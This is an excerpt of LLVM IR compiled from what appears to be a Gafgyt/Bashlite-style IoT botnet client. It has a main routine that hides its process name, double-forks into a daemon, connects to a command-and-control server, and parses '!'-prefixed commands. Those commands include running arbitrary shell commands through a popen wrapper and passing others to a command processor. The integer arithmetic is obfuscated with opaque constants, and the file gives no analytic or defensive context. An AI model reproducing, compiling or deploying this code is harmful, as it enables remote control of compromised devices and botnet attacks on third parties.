  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %105

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.112, i32 0, i32 0)) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %105

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #2
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %105

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.113, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.114, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %102

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.6* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #2
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %101

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.7* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = sub i32 0, %95
  %97 = sub i32 0, 1
  %98 = add i32 %96, %97
  %99 = sub i32 0, %98
  %100 = add nsw i32 %95, 1
  store i32 %99, i32* %10, align 4
  br label %79

; <label>:101:                                    ; preds = %79
  br label %102

; <label>:102:                                    ; preds = %101, %65
  %103 = load i32, i32* %2, align 4
  %104 = call i32 @close(i32 %103)
  br label %105

; <label>:105:                                    ; preds = %102, %36, %29, %15
  %106 = load i32, i32* %1, align 4
  ret i32 %106
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.115, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.116, i32 0, i32 0), i8** %6, align 8
  %25 = call i8* @getBuild()
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.117, i32 0, i32 0), i8* %25)
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i64 @strlen(i8* %32) #10
  %34 = call i8* @strncpy(i8* %29, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.116, i32 0, i32 0), i64 %33) #2
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.116, i32 0, i32 0), i8** %36, align 8
  %37 = load i8*, i8** %6, align 8
  %38 = ptrtoint i8* %37 to i64
  %39 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %38, i32 0, i32 0, i32 0)
  %40 = call i64 @time(i64* null) #2
  %41 = call i32 @getpid() #2
  %42 = sext i32 %41 to i64
  %43 = xor i64 %40, -1
  %44 = and i64 %42, %43
  %45 = xor i64 %42, -1
  %46 = and i64 %40, %45
  %47 = or i64 %44, %46
  %48 = xor i64 %40, %42
  %49 = trunc i64 %47 to i32
  call void @srand(i32 %49) #2
  %50 = call i64 @time(i64* null) #2
  %51 = call i32 @getpid() #2
  %52 = sext i32 %51 to i64
  %53 = xor i64 %50, -1
  %54 = and i64 6293694534940463129, %53
  %55 = xor i64 6293694534940463129, -1
  %56 = and i64 %50, %55
  %57 = xor i64 %52, -1
  %58 = and i64 %57, 6293694534940463129
  %59 = and i64 %52, %55
  %60 = or i64 %54, %56
  %61 = or i64 %58, %59
  %62 = xor i64 %60, %61
  %63 = xor i64 %50, %52
  %64 = trunc i64 %62 to i32
  call void @init_rand(i32 %64)
  %65 = call i32 @getOurIP()
  %66 = call i32 @fork() #2
  store i32 %66, i32* %7, align 4
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %68, label %71

; <label>:68:                                     ; preds = %2
  %69 = load i32, i32* %7, align 4
  %70 = call i32 @waitpid(i32 %69, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:71:                                     ; preds = %2
  %72 = load i32, i32* %7, align 4
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %86, label %74

; <label>:74:                                     ; preds = %71
  %75 = call i32 @fork() #2
  store i32 %75, i32* %8, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %78

; <label>:77:                                     ; preds = %74
  call void @exit(i32 0) #14
  unreachable

; <label>:78:                                     ; preds = %74
  %79 = load i32, i32* %8, align 4
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %82, label %81

; <label>:81:                                     ; preds = %78
  br label %84

; <label>:82:                                     ; preds = %78
  %83 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.118, i32 0, i32 0))
  br label %84

; <label>:84:                                     ; preds = %82, %81
  br label %85

; <label>:85:                                     ; preds = %84
  br label %88

; <label>:86:                                     ; preds = %71
  %87 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.118, i32 0, i32 0))
  br label %88

; <label>:88:                                     ; preds = %86, %85
  br label %89

; <label>:89:                                     ; preds = %88
  %90 = call i32 @setsid() #2
  %91 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.119, i32 0, i32 0)) #2
  %92 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %93

; <label>:93:                                     ; preds = %428, %96, %89
  %94 = call i32 @initConnection()
  %95 = icmp ne i32 %94, 0
  br i1 %95, label %96, label %98

; <label>:96:                                     ; preds = %93
  %97 = call i32 @sleep(i32 5)
  br label %93

; <label>:98:                                     ; preds = %93
  %99 = load i32, i32* @mainCommSock, align 4
  %100 = call i8* @getBuild()
  %101 = call i32 (i32, i8*, ...) @sockprintf(i32 %99, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.120, i32 0, i32 0), i8* %100)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %102

; <label>:102:                                    ; preds = %427, %337, %250, %212, %98
  %103 = load i32, i32* @mainCommSock, align 4
  %104 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %105 = call i32 @recvLine(i32 %103, i8* %104, i32 4096)
  store i32 %105, i32* %11, align 4
  %106 = icmp ne i32 %105, -1
  br i1 %106, label %107, label %428

; <label>:107:                                    ; preds = %102
  store i32 0, i32* %12, align 4
  br label %108

; <label>:108:                                    ; preds = %197, %107
  %109 = load i32, i32* %12, align 4
  %110 = sext i32 %109 to i64
  %111 = load i64, i64* @numpids, align 8
  %112 = icmp ult i64 %110, %111
  br i1 %112, label %113, label %203

; <label>:113:                                    ; preds = %108
  %114 = load i32*, i32** @pids, align 8
  %115 = load i32, i32* %12, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i32, i32* %114, i64 %116
  %118 = load i32, i32* %117, align 4
  %119 = call i32 @waitpid(i32 %118, i32* null, i32 1)
  %120 = icmp sgt i32 %119, 0
  br i1 %120, label %121, label %196

; <label>:121:                                    ; preds = %113
  %122 = load i32, i32* %12, align 4
  %123 = add i32 %122, -184990578
  %124 = add i32 %123, 1
  %125 = sub i32 %124, -184990578
  %126 = add nsw i32 %122, 1
  store i32 %125, i32* %14, align 4
  br label %127

; <label>:127:                                    ; preds = %145, %121
  %128 = load i32, i32* %14, align 4
  %129 = zext i32 %128 to i64
  %130 = load i64, i64* @numpids, align 8
  %131 = icmp ult i64 %129, %130
  br i1 %131, label %132, label %151

; <label>:132:                                    ; preds = %127
  %133 = load i32*, i32** @pids, align 8
  %134 = load i32, i32* %14, align 4
  %135 = zext i32 %134 to i64
  %136 = getelementptr inbounds i32, i32* %133, i64 %135
  %137 = load i32, i32* %136, align 4
  %138 = load i32*, i32** @pids, align 8
  %139 = load i32, i32* %14, align 4
  %140 = sub i32 0, 1
  %141 = add i32 %139, %140
  %142 = sub i32 %139, 1
  %143 = zext i32 %141 to i64
  %144 = getelementptr inbounds i32, i32* %138, i64 %143
  store i32 %137, i32* %144, align 4
  br label %145

; <label>:145:                                    ; preds = %132
  %146 = load i32, i32* %14, align 4
  %147 = sub i32 %146, 1400727894
  %148 = add i32 %147, 1
  %149 = add i32 %148, 1400727894
  %150 = add i32 %146, 1
  store i32 %149, i32* %14, align 4
  br label %127

; <label>:151:                                    ; preds = %127
  %152 = load i32*, i32** @pids, align 8
  %153 = load i32, i32* %14, align 4
  %154 = add i32 %153, 409166165
  %155 = sub i32 %154, 1
  %156 = sub i32 %155, 409166165
  %157 = sub i32 %153, 1
  %158 = zext i32 %156 to i64
  %159 = getelementptr inbounds i32, i32* %152, i64 %158
  store i32 0, i32* %159, align 4
  %160 = load i64, i64* @numpids, align 8
  %161 = sub i64 0, -1
  %162 = sub i64 %160, %161
  %163 = add i64 %160, -1
  store i64 %162, i64* @numpids, align 8
  %164 = load i64, i64* @numpids, align 8
  %165 = add i64 %164, 3359101168485907346
  %166 = add i64 %165, 1
  %167 = sub i64 %166, 3359101168485907346
  %168 = add i64 %164, 1
  %169 = mul i64 %167, 4
  %170 = call noalias i8* @malloc(i64 %169) #2
  %171 = bitcast i8* %170 to i32*
  store i32* %171, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %172

; <label>:172:                                    ; preds = %187, %151
  %173 = load i32, i32* %14, align 4
  %174 = zext i32 %173 to i64
  %175 = load i64, i64* @numpids, align 8
  %176 = icmp ult i64 %174, %175
  br i1 %176, label %177, label %192

; <label>:177:                                    ; preds = %172
  %178 = load i32*, i32** @pids, align 8
  %179 = load i32, i32* %14, align 4
  %180 = zext i32 %179 to i64
  %181 = getelementptr inbounds i32, i32* %178, i64 %180
  %182 = load i32, i32* %181, align 4
  %183 = load i32*, i32** %13, align 8
  %184 = load i32, i32* %14, align 4
  %185 = zext i32 %184 to i64
  %186 = getelementptr inbounds i32, i32* %183, i64 %185
  store i32 %182, i32* %186, align 4
  br label %187

; <label>:187:                                    ; preds = %177
  %188 = load i32, i32* %14, align 4
  %189 = sub i32 0, 1
  %190 = sub i32 %188, %189
  %191 = add i32 %188, 1
  store i32 %190, i32* %14, align 4
  br label %172

; <label>:192:                                    ; preds = %172
  %193 = load i32*, i32** @pids, align 8
  %194 = bitcast i32* %193 to i8*
  call void @free(i8* %194) #2
  %195 = load i32*, i32** %13, align 8
  store i32* %195, i32** @pids, align 8
  br label %196

; <label>:196:                                    ; preds = %192, %113
  br label %197

; <label>:197:                                    ; preds = %196
  %198 = load i32, i32* %12, align 4
  %199 = sub i32 %198, -944175116
  %200 = add i32 %199, 1
  %201 = add i32 %200, -944175116
  %202 = add nsw i32 %198, 1
  store i32 %201, i32* %12, align 4
  br label %108

; <label>:203:                                    ; preds = %108
  %204 = load i32, i32* %11, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %205
  store i8 0, i8* %206, align 1
  %207 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %207)
  %208 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %209 = call i8* @strstr(i8* %208, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i32 0, i32 0)) #10
  %210 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %211 = icmp eq i8* %209, %210
  br i1 %211, label %212, label %215

; <label>:212:                                    ; preds = %203
  %213 = load i32, i32* @mainCommSock, align 4
  %214 = call i32 (i32, i8*, ...) @sockprintf(i32 %213, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.121, i32 0, i32 0))
  br label %102

; <label>:215:                                    ; preds = %203
  %216 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %217 = call i8* @strstr(i8* %216, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.122, i32 0, i32 0)) #10
  %218 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %219 = icmp eq i8* %217, %218
  br i1 %219, label %220, label %221

; <label>:220:                                    ; preds = %215
  call void @exit(i32 0) #14
  unreachable

; <label>:221:                                    ; preds = %215
  %222 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %222, i8** %15, align 8
  %223 = load i8*, i8** %15, align 8
  %224 = load i8, i8* %223, align 1
  %225 = zext i8 %224 to i32
  %226 = icmp eq i32 %225, 33
  br i1 %226, label %227, label %427

; <label>:227:                                    ; preds = %221
  %228 = load i8*, i8** %15, align 8
  %229 = getelementptr inbounds i8, i8* %228, i64 1
  store i8* %229, i8** %16, align 8
  br label %230

; <label>:230:                                    ; preds = %242, %227
  %231 = load i8*, i8** %16, align 8
  %232 = load i8, i8* %231, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp ne i32 %233, 32
  br i1 %234, label %235, label %240

; <label>:235:                                    ; preds = %230
  %236 = load i8*, i8** %16, align 8
  %237 = load i8, i8* %236, align 1
  %238 = zext i8 %237 to i32
  %239 = icmp ne i32 %238, 0
  br label %240

; <label>:240:                                    ; preds = %235, %230
  %241 = phi i1 [ false, %230 ], [ %239, %235 ]
  br i1 %241, label %242, label %245

; <label>:242:                                    ; preds = %240
  %243 = load i8*, i8** %16, align 8
  %244 = getelementptr inbounds i8, i8* %243, i32 1
  store i8* %244, i8** %16, align 8
  br label %230

; <label>:245:                                    ; preds = %240
  %246 = load i8*, i8** %16, align 8
  %247 = load i8, i8* %246, align 1
  %248 = zext i8 %247 to i32
  %249 = icmp eq i32 %248, 0
  br i1 %249, label %250, label %251

; <label>:250:                                    ; preds = %245
  br label %102

; <label>:251:                                    ; preds = %245
  %252 = load i8*, i8** %16, align 8
  store i8 0, i8* %252, align 1
  %253 = load i8*, i8** %15, align 8
  %254 = getelementptr inbounds i8, i8* %253, i64 1
  store i8* %254, i8** %16, align 8
  %255 = load i8*, i8** %15, align 8
  %256 = load i8*, i8** %16, align 8
  %257 = call i64 @strlen(i8* %256) #10
  %258 = getelementptr inbounds i8, i8* %255, i64 %257
  %259 = getelementptr inbounds i8, i8* %258, i64 2
  store i8* %259, i8** %15, align 8
  br label %260

; <label>:260:                                    ; preds = %286, %251
  %261 = load i8*, i8** %15, align 8
  %262 = load i8*, i8** %15, align 8
  %263 = call i64 @strlen(i8* %262) #10
  %264 = add i64 %263, -3196439752175891211
  %265 = sub i64 %264, 1
  %266 = sub i64 %265, -3196439752175891211
  %267 = sub i64 %263, 1
  %268 = getelementptr inbounds i8, i8* %261, i64 %266
  %269 = load i8, i8* %268, align 1
  %270 = zext i8 %269 to i32
  %271 = icmp eq i32 %270, 10
  br i1 %271, label %284, label %272

; <label>:272:                                    ; preds = %260
  %273 = load i8*, i8** %15, align 8
  %274 = load i8*, i8** %15, align 8
  %275 = call i64 @strlen(i8* %274) #10
  %276 = sub i64 %275, -1872371953371920269
  %277 = sub i64 %276, 1
  %278 = add i64 %277, -1872371953371920269
  %279 = sub i64 %275, 1
  %280 = getelementptr inbounds i8, i8* %273, i64 %278
  %281 = load i8, i8* %280, align 1
  %282 = zext i8 %281 to i32
  %283 = icmp eq i32 %282, 13
  br label %284

; <label>:284:                                    ; preds = %272, %260
  %285 = phi i1 [ true, %260 ], [ %283, %272 ]
  br i1 %285, label %286, label %295

; <label>:286:                                    ; preds = %284
  %287 = load i8*, i8** %15, align 8
  %288 = load i8*, i8** %15, align 8
  %289 = call i64 @strlen(i8* %288) #10
  %290 = add i64 %289, -465593755740876683
  %291 = sub i64 %290, 1
  %292 = sub i64 %291, -465593755740876683
  %293 = sub i64 %289, 1
  %294 = getelementptr inbounds i8, i8* %287, i64 %292
  store i8 0, i8* %294, align 1
  br label %260

; <label>:295:                                    ; preds = %284
  %296 = load i8*, i8** %15, align 8
  store i8* %296, i8** %17, align 8
  br label %297

; <label>:297:                                    ; preds = %309, %295
  %298 = load i8*, i8** %15, align 8
  %299 = load i8, i8* %298, align 1
  %300 = zext i8 %299 to i32
  %301 = icmp ne i32 %300, 32
  br i1 %301, label %302, label %307

; <label>:302:                                    ; preds = %297
  %303 = load i8*, i8** %15, align 8
  %304 = load i8, i8* %303, align 1
  %305 = zext i8 %304 to i32
  %306 = icmp ne i32 %305, 0
  br label %307

; <label>:307:                                    ; preds = %302, %297
  %308 = phi i1 [ false, %297 ], [ %306, %302 ]
  br i1 %308, label %309, label %312

; <label>:309:                                    ; preds = %307
  %310 = load i8*, i8** %15, align 8
  %311 = getelementptr inbounds i8, i8* %310, i32 1
  store i8* %311, i8** %15, align 8
  br label %297

; <label>:312:                                    ; preds = %307
  %313 = load i8*, i8** %15, align 8
  store i8 0, i8* %313, align 1
  %314 = load i8*, i8** %15, align 8
  %315 = getelementptr inbounds i8, i8* %314, i32 1
  store i8* %315, i8** %15, align 8
  %316 = load i8*, i8** %17, align 8
  store i8* %316, i8** %18, align 8
  br label %317

; <label>:317:                                    ; preds = %321, %312
  %318 = load i8*, i8** %18, align 8
  %319 = load i8, i8* %318, align 1
  %320 = icmp ne i8 %319, 0
  br i1 %320, label %321, label %330

; <label>:321:                                    ; preds = %317
  %322 = load i8*, i8** %18, align 8
  %323 = load i8, i8* %322, align 1
  %324 = zext i8 %323 to i32
  %325 = call i32 @toupper(i32 %324) #10
  %326 = trunc i32 %325 to i8
  %327 = load i8*, i8** %18, align 8
  store i8 %326, i8* %327, align 1
  %328 = load i8*, i8** %18, align 8
  %329 = getelementptr inbounds i8, i8* %328, i32 1
  store i8* %329, i8** %18, align 8
  br label %317

; <label>:330:                                    ; preds = %317
  %331 = load i8*, i8** %17, align 8
  %332 = call i32 @strcmp(i8* %331, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.123, i32 0, i32 0)) #10
  %333 = icmp eq i32 %332, 0
  br i1 %333, label %334, label %357

; <label>:334:                                    ; preds = %330
  %335 = call i32 @listFork()
  %336 = icmp ne i32 %335, 0
  br i1 %336, label %337, label %338

; <label>:337:                                    ; preds = %334
  br label %102

; <label>:338:                                    ; preds = %334
  %339 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %339, i8 0, i64 1024, i32 16, i1 false)
  %340 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %341 = load i8*, i8** %15, align 8
  %342 = call i32 (i8*, i8*, ...) @szprintf(i8* %340, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.124, i32 0, i32 0), i8* %341)
  %343 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %344 = call i32 @fdpopen(i8* %343, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.125, i32 0, i32 0))
  store i32 %344, i32* %20, align 4
  br label %345

; <label>:345:                                    ; preds = %350, %338
  %346 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %347 = load i32, i32* %20, align 4
  %348 = call i8* @fdgets(i8* %346, i32 1024, i32 %347)
  %349 = icmp ne i8* %348, null
  br i1 %349, label %350, label %354

; <label>:350:                                    ; preds = %345
  %351 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %351)
  %352 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %352, i8 0, i64 1024, i32 16, i1 false)
  %353 = call i32 @sleep(i32 1)
  br label %345

; <label>:354:                                    ; preds = %345
  %355 = load i32, i32* %20, align 4
  %356 = call i32 @fdpclose(i32 %355)
  call void @exit(i32 0) #14
  unreachable

; <label>:357:                                    ; preds = %330
  store i32 1, i32* %22, align 4
  %358 = load i8*, i8** %15, align 8
  %359 = call i8* @strtok(i8* %358, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i32 0, i32 0)) #2
  store i8* %359, i8** %23, align 8
  %360 = load i8*, i8** %17, align 8
  %361 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %360, i8** %361, align 16
  br label %362

; <label>:362:                                    ; preds = %402, %357
  %363 = load i8*, i8** %23, align 8
  %364 = icmp ne i8* %363, null
  br i1 %364, label %365, label %404

; <label>:365:                                    ; preds = %362
  %366 = load i8*, i8** %23, align 8
  %367 = load i8, i8* %366, align 1
  %368 = zext i8 %367 to i32
  %369 = icmp ne i32 %368, 10
  br i1 %369, label %370, label %402

; <label>:370:                                    ; preds = %365
  %371 = load i8*, i8** %23, align 8
  %372 = call i64 @strlen(i8* %371) #10
  %373 = add i64 %372, 6717396580631942690
  %374 = add i64 %373, 1
  %375 = sub i64 %374, 6717396580631942690
  %376 = add i64 %372, 1
  %377 = call noalias i8* @malloc(i64 %375) #2
  %378 = load i32, i32* %22, align 4
  %379 = sext i32 %378 to i64
  %380 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %379
  store i8* %377, i8** %380, align 8
  %381 = load i32, i32* %22, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %382
  %384 = load i8*, i8** %383, align 8
  %385 = load i8*, i8** %23, align 8
  %386 = call i64 @strlen(i8* %385) #10
  %387 = add i64 %386, -4527204624591126053
  %388 = add i64 %387, 1
  %389 = sub i64 %388, -4527204624591126053
  %390 = add i64 %386, 1
  call void @llvm.memset.p0i8.i64(i8* %384, i8 0, i64 %389, i32 1, i1 false)
  %391 = load i32, i32* %22, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %392
  %394 = load i8*, i8** %393, align 8
  %395 = load i8*, i8** %23, align 8
  %396 = call i8* @strcpy(i8* %394, i8* %395) #2
  %397 = load i32, i32* %22, align 4
  %398 = sub i32 %397, -1730054834
  %399 = add i32 %398, 1
  %400 = add i32 %399, -1730054834
  %401 = add nsw i32 %397, 1
  store i32 %400, i32* %22, align 4
  br label %402

; <label>:402:                                    ; preds = %370, %365
  %403 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i32 0, i32 0)) #2
  store i8* %403, i8** %23, align 8
  br label %362

; <label>:404:                                    ; preds = %362
  %405 = load i32, i32* %22, align 4
  %406 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %405, i8** %406)
  %407 = load i32, i32* %22, align 4
  %408 = icmp sgt i32 %407, 1
  br i1 %408, label %409, label %426

; <label>:409:                                    ; preds = %404
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  br label %410

; <label>:410:                                    ; preds = %419, %409
  %411 = load i32, i32* %24, align 4
  %412 = load i32, i32* %22, align 4
  %413 = icmp slt i32 %411, %412
  br i1 %413, label %414, label %425

; <label>:414:                                    ; preds = %410
  %415 = load i32, i32* %24, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %416
  %418 = load i8*, i8** %417, align 8
  call void @free(i8* %418) #2
  br label %419

; <label>:419:                                    ; preds = %414
  %420 = load i32, i32* %24, align 4
  %421 = add i32 %420, -1503397762
  %422 = add i32 %421, 1
  %423 = sub i32 %422, -1503397762
  %424 = add nsw i32 %420, 1
  store i32 %423, i32* %24, align 4
  br label %410

; <label>:425:                                    ; preds = %410
  br label %426

; <label>:426:                                    ; preds = %425, %404
  br label %427

; <label>:427:                                    ; preds = %426, %221
  br label %102

; <label>:428:                                    ; preds = %102
  br label %93
